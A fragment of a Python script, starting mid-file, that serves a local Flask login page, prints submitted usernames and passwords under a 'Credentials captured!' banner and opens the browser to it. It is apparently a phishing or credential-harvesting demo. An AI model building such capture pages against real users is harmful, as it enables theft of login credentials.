        print(f"\n{Fore.RED}[!] Credentials captured!{Style.RESET_ALL}")
        print(f"Username: {username}")
        print(f"Password: {password}")
        return "Login successful!"

    # Run the server in a separate thread
    def run_server():
        app.run(port=5000, debug=False, use_reloader=False)

    print(f"\n{Fore.GREEN}[*] Starting web server on http://127.0.0.1:5000")
    print(f"{Fore.YELLOW}[!] Press Ctrl+C to stop the server{Style.RESET_ALL}")

    # Start the server in a new thread
    server_thread = threading.Thread(target=run_server)
    server_thread.daemon = True
    server_thread.start()

    # Open the browser automatically
    webbrowser.open('http://127.0.0.1:5000')

    try:
        # Keep the main thread alive
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[*] Server stopped{Style.RESET_ALL}")


if __name__ == "__main__":
    init(autoreset=True)
    try:
        main()
    except KeyboardInterrupt:
        print("\nProgramm wurde beendet.")
    except Exception as e:
        print(f"\nEin Fehler ist aufgetreten: {str(e)}")
        input("Drücke Enter um fortzufahren")